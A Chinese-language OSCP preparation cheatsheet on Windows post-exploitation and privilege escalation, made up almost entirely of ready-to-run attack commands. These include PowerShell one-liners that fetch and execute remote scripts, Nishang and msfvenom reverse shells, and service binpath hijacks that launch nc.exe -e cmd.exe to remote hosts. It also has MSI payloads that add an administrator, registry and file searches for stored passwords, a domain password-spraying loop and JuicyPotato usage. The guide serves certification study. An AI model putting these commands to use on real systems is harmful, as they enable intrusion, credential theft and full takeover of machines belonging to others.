最近在准备OSCP的考试，将平时用到的一些方法结合网上一些方法总结为cheatsheet，便于梳理思路，后续会持续推出一些总结和利用，主要面向和我一样的初级学习者，希望能够共同进步

## 1.powershell使用

#### 下载文件(类似wget)：

    
    
    powershell -command (new-object System.Net.WebClient).DownloadFile('http://10.10.14.19:1234/rottenpotato.exe','C:\Users\Public\potato.exe')

#### 下载powershell的modules并导入：

    
    
    powershell -c 'IEX(New-Object Net.WebClient).DownloadString(“http://<ip_address>/full_path/script_name.ps1”)'

#### 用Nishang获取一个反向的Powershell：

    
    
      
    powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.19/Invoke-PowerShellTcp.ps1','C:\Users\Public\Invoke-PowersShellTcp.ps1')  
    ​  
    powershell -exec bypass -c Import-Module .\Invoke-PowerShellTcp.ps1;Invoke-PowerShellTcp -Reverse -IPAddress 192.168.56.104 -Port 443

###  **直接下载并执行**

    
    
    powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(“http://192.168.56.104/Invoke-PowerShellTcp.ps1”);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.56.104 -Port 443

## 2.其他提权姿势汇总

###  **基本信息收集**

    
    
    hostname  
    whoami  
    echo %USERNAME%  
    net users  
    net users <username>  
    net localgroups  
    net group /domain  
    netstat -ano  
    netsh firewall show state  
      
    ​  
    wmic qfe get Caption,Description,HotFixID,InstalledOn  
      
    # 计划任务查询  
    schtasks /query /fo LIST /v  
    tasklist /SVC  
      
    net start  
      
    DRIVERQUERY

###  **PowerSploit:**

[Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)-域控查询，并查看是否有其他主机的admin权限

    
    
    powershell -exec bypass  
    import-module powerview.ps1  
    Find-LocalAdminAccess

寻找密码，配置文件

    
    
    findstr /si password *.txt | *.xml | *.ini  
    dir /s *pass* == *cred* == *vnc* == *.config*  
    findstr /spin "password" *.*  
    findstr /spin "password" *.*  
      
    dir /b /s web.config  
    dir /b /s unattend.xml  
    dir /b /s sysprep.inf  
    dir /b /s sysprep.xml  
    dir /b /s *pass*

###  **查看注册表信息**

    
    
    # 搜索自动登录信息:  
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
      
    # 搜索VNC登录信息:  
    reg query "HKCU\Software\ORL\WinVNC3\Password"  
      
    # 搜索putty登录会话:  
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  
      
    # 在HKLM搜索password:  
    reg query HKLM /f password /t REG_SZ /s | clip  
      
    # 在HKCU搜索password:  
    reg query HKCU /f password /t REG_SZ /s | clip

###  **检查端口 &端口转发**

    
    
    netstat -ano
     
    plink.exe -l root -pw mysecretpass 192.168.1.2. -R 8080:127.0.0.1:8080
    

### exploit suggester模块检查内核漏洞

    
    
    #使用windows-exploit-suggester.py检查内核漏洞
    windows-exploit-suggester.py -updatedb
    windows-exploit-suggester.py --database ./2020-10-15-mssb.xls --systeminfo systeminfo.txt
    

### 使用sherlock检查能否提权

    
    
    #本地执行
    c:\>powershell -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
    
    #从网上下载一个PowerShell脚本并执行它无需写入磁盘。它也不会导致任何配置更改。
    powershell.exe -nop -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.119.215:8000/zzz.ps1')"
    

### “AT”命令提权

    
    
    #XP系统可用，win7版本后不支持，设置计划命令执行相应命令
    # 生成一个shell
    msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
     
    # 定时启动这个shell文件
    at 13:20 /interactice shell.exe
    
    

### 计划任务+sc提权

    
    
    #查找高权限的任务:
    schtasks /query /fo LIST /v 
    
    # 放到linux里提取关键字:
    cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
    
    # 找到upnphost这个任务，通过sc指定upnphost这个服务的路径，使用的账号等:
    sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
    sc config upnphost obj= ".\LocalSystem" password= ""
    sc config upnphost depend= ""
    
    # 重启这个服务:
    wmic service NAMEOFSERVICE call startservice
    ## OR:
    net stop [service name] && net start [service name]
    

### accesschk+sc提权

    
    
    #首先利用meterpreter上传工具
    meterpreter > upload accesschk_xp.exe c:\\xxx\\accesschk_xp.exe
    #检查当前用户xx具有写权限的windows服务
    C:\xx>accesschk_xp.exe /accepteula -uwcqv "用户名 *" > ack.txt
    #找到SSDPSRV服务，对其进行检查
    C:\xx>accesschk_xp.exe /accepteula -ucqv SSDPSRV
    #修改服务路径
    C:\xx>sc config SSDPSRV binpath= "c:\inetpub\nc.exe -nv 10.11.0.90 9090 -e cmd.exe
    #修改服务账户名
    C:\xx>sc config SSDPSRV obj= ".\LocalSystem" password= "" 
    #start= "demand"——指定是必须手动启动的服务
    C:\xx>sc config SSDPSRV start= "demand"
    #启动服务监听
    C:\xx>net start SSDPSRV
    

### icacls+sc提权

    
    
    # 检查服务:
    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
    icacls “C:\Program Files\Some Folder”
    sc query
    sc query <service_name>
     
    # 生成 Payload:
    msfvenom -p windows/shell_reverse_tco -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o Privatefirewall.exe
     
    # 改变路径:
    sc config <service_name> binpath= "C:\shell.exe"
     
    # 重启服务:
    shutdown /r /t 0
    sc <servicename> stop & sc <servicename> start
    ## OR
    wmic service NAMEOFSERVICE call startservice
    ## OR:
    net stop [service name] && net start [service name]
    

### 检查AlwaysInstallElevated组策略设置

    
    
    # 注册表打开AlwaysInstall Elevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer \v AlwaysInstallElevated
     
    # 注册表打开AlwaysInstall Elevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer \v AlwaysInstallElevated
     
    #---------------------------------------------------#
    #初始MSI类型的Payload:                              #
    #---------------------------------------------------#
    # If the bit is set then we:
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=443 –f msi > shell.msi 
     
    # 上传并执行:
    msiexec /quiet /qn /i  1.msi
     
    #----------------------------------------------------#
    #第二个MSI类型的Payload:                             #
    #----------------------------------------------------#
    # 添加用户，创建第二段payload加admin权限:
    net user lokii lokii /add 
    msfvenom -p windows/exec CMD='net localgroup administrators lokii /add' -f msi > upgrade.msi
    

### 密码喷洒(Password Spraying)

    
    
    # 列出用户
    net user /domain > users.txt
     
    # 执行如下脚本，固定密码对组内用户进行密码喷洒
    @FOR /F %n in (users.txt) DO
    @FOR / F %p in (pass.txt) DO
    @net use \\[DOMAINCONTROLLER]\IPC$ /user:[DOMAIN]\%n %p 1>NUL 2>&1 &&
    @echo [*] %n:%p &&
    @net use /delete \\[DOMAINCONTROLLER]IPC$ > NULL
     
    # 举个例子:
    net user /domain > DomainUsers.txt
    echo "Password1" >> pass.txt
    echo "1q2w3e4r" >> pass.txt
    @FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (pass.txt) DO @net use \\COMPANYDC1\
    #也可以使用powershell脚本'DomainPasswordSpray'
    Import-Module .\DomainPasswordSpray.ps1
    Invoke-DomainPasswordSpray -Password 密码
    

### juicy-potato提权

来自3gstudent的文章

    
    
    1.whoami /priv
    如果开启SeImpersonate权限，juicypotato的参数可以使用-t t
    如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u
    如果均开启，可以选择-t *
    如果均未开启，那么无法提权
    
    2、查看RPC默认端口是否为135
    如果被修改(例如为111)，juicypotato的参数可以使用-n 111
    
    3、根据操作系统选择可用的CLSID
    参考列表
    https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
    例如测试系统Server2012，选择CLSID为{8BC3F05E-D86B-11D0-A075-00C04FB68820}
    
    4、选择一个系统未占用的端口作为监听端口
    例如，最终参数如下：
    JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
    
    针对Juicy Potato的关键在于权限的控制，阻止攻击者获得SeImpersonate或者SeAssignPrimaryToken权限
    

  

  

